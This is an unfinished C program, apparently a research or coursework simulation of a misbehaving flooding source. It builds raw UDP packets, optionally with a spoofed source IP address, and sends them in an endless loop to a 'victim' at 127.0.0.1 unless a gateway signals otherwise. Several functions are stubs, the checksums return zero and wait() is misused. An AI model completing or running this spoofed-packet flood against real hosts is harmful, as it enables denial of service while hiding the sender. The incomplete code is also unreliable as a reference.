#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <netinet/in.h> 
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pthread.h>
#include "shared.h"


#define TRUE 0
#define FALSE 1
#define ATTACKER_PORT 4404
#define VICTIM_PORT 4404

#define IPV4_HEADER_LENGTH 20
#define UDP_HEADER_LENGTH 8

//#define INTERFACE "eth0"
#define INTERFACE "lo"

int inDisobedientMode = FALSE;
int spoofIPAddress = FALSE;


void reportError(char* errorMessage){
	printf("%s\n", errorMessage);
	exit(1);
}

void *listenToComplaints(void *noComplaintsFromGateway){
	//enter a while loop listening for message from attacker gateway
	//break loop after received
	*(int*)noComplaintsFromGateway = FALSE; 

	return NULL;
}

uint16_t ipChecksum(){ //TODO
	return 0;
}

uint16_t udpChecksum(){ //TODO
	return 0;
}


int main(int argc, char** argv){
	if(argc == 1){
		reportError("Usage: attackerProgram true/false [spoof IP address]");
	}

	//determine obedient/disobedient mode
	if(strcmp(argv[1], "false") == 0 || strcmp(argv[1], "FALSE") == 0){
		inDisobedientMode = TRUE;
		printf("Runs in disobedient mode\n");
	}

	if(argc == 3){
		spoofIPAddress = TRUE;
		printf("Spoof IP address enabled\n");
	}


	int sockfd;
	char *destIPChar = "127.0.0.1";//TODO: dest ip?? - or use getaddrinfo()? not finished
	char srcIPChar[INET_ADDRSTRLEN];
	//struct addrinfo hints, *res, *p;
	struct sockaddr_in victimAddress;


	//network setup
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sockfd < 0) reportError("socket() failed");

	//bind to correct port and interface????
//	bind(); TODO


	//get source information
	// srcIPChar = (char*)malloc(INET_ADDRSTRLEN);
	if(spoofIPAddress == TRUE){
		strcpy(srcIPChar, argv[2]);
	} else {
		//code from http://stackoverflow.com/questions/20800319/how-to-get-my-ip-address-in-c-linux
		struct ifaddrs *ifaddr, *tmp;
		if(getifaddrs(&ifaddr) == -1){
			reportError("getifaddrs() failed");
		}
		tmp = ifaddr;
		while(tmp){
			if(tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET){
				printf("interface name %s\n", tmp->ifa_name);
				if(strcmp(tmp->ifa_name, INTERFACE) == 0){
					strcpy(srcIPChar, inet_ntoa(((struct sockaddr_in *)tmp->ifa_addr)->sin_addr));
					break;
				}
			}
			tmp = tmp->ifa_next;
		}
	}
	printf("Use IP address %s\n", srcIPChar);

	//get destination information -- TODO
	bzero(&victimAddress, sizeof(victimAddress));
	victimAddress.sin_family = AF_INET;
	victimAddress.sin_port = htons(VICTIM_PORT);
	if(inet_pton(AF_INET, destIPChar, &(victimAddress.sin_addr)) != 1){
		reportError("inet_pton failed");
	}
	// victimAddress.sin_addr.s_addr = ?





	//construct datagram
		//code comes from udp4.c in http://www.pdbuchan.com/rawsock/rawsock.html

	//IPv4 header
	struct ip iphdr;
	iphdr.ip_hl = IPV4_HEADER_LENGTH / sizeof(uint32_t);
	iphdr.ip_v = 4;
	iphdr.ip_tos = 0;
	iphdr.ip_len = htons(IPV4_HEADER_LENGTH + UDP_HEADER_LENGTH); //empty content, data length = 0
	iphdr.ip_id = htons(0); //sequence number, unused
	iphdr.ip_off = htons(0); //flags, unused TODO not sure
	iphdr.ip_ttl = 255; //time-to-live, set to maximum
	iphdr.ip_p = IPPROTO_UDP; 
	//source ip address
	if(inet_pton(AF_INET, srcIPChar, &(iphdr.ip_src)) != 1) {
		reportError("inet_pton for source ip address failed");
	}
	//dest ip address
	if(inet_pton(AF_INET, destIPChar, &(iphdr.ip_dst)) != 1) {
		reportError("inet_pton for destination ip address failed");
	}
	iphdr.ip_sum = 0;
	iphdr.ip_sum = ipChecksum();//checksum TODO

	//UDP header
	struct udphdr udphdr;
	udphdr.source = htons(ATTACKER_PORT);
	udphdr.dest = htons(VICTIM_PORT);
	udphdr.len = htons(UDP_HEADER_LENGTH);
	udphdr.check = udpChecksum();//checksum for udp TODO

	//prepare packet 
	char *packet = (char*)malloc(sizeof(struct ip) + sizeof(struct udphdr));
	memcpy(packet, &iphdr, IPV4_HEADER_LENGTH * sizeof(uint8_t));
	memcpy(packet + IPV4_HEADER_LENGTH, &udphdr, UDP_HEADER_LENGTH * sizeof(uint8_t));
	//no data, thus do not call memcpy for the third time

	//set flag so socket expects us to provide IPv4 header
	int on = 1;
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
		reportError("setsockopt() failed");
	}

	//bind socket to interface index??? TODO
	//send packet



	//TODO replace the above sendto() with the logic below

	int noComplaintsFromGateway = TRUE;
	pthread_t thread;
	if(pthread_create(&thread, NULL, listenToComplaints, &noComplaintsFromGateway) != 0){
		reportError("Error creating thead\n");
	}

	while(1){
		if(inDisobedientMode == TRUE || noComplaintsFromGateway == FALSE){
			if(sendto(sockfd, packet, IPV4_HEADER_LENGTH + UDP_HEADER_LENGTH, 0, 
						(struct sockaddr*)&victimAddress, sizeof(victimAddress)) < 0){
				printf("Unable to send packet.\n");
			} else {
				printf("Packet sent.\n");
			}
			//wait for T-send before resend the packet
			wait(T_SEND);

		}
	}

	if(pthread_join(thread, NULL)){
		reportError("Error joining thread\n");
	}
	
//-------------------

	// hints.ai_family = AF_UNSPEC;
	// hints.ai_socktype = SOCK_DGRAM;
	// hints.ai_protocol = 0;
	// hints.ai_flags = AI_ADDRCONFIG; //AI_PASSIVE? TODO

	// if(getaddrinfo(NULL, PORT, &hints, &res) != 0){ //TODO NULL?
	// 	printf("getaddrinfo() failed\n");
	// 	exit(1);
	// }

	// for(p = res; p != NULL; p = p->ai_next){
	// 	sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
		
	// 	if(sockfd < 0) continue;

	// 	if(bind(sockfd, p->ai_addr, p->ai_addrlen) == 0) break;

	// 	close(sockfd);

	// }

	// if(p == NULL){
	// 	reportError("could not bind");
	// }

	// freeaddrinfo(res);



	//send or sendto

// http://www.microhowto.info/howto/send_a_udp_datagram_in_c.html
// http://www.overclock.net/t/1264544/sending-udp-packets-c-programming

	//
	//http://www.binarytides.com/raw-udp-sockets-c-linux/
	//
	return 0;
}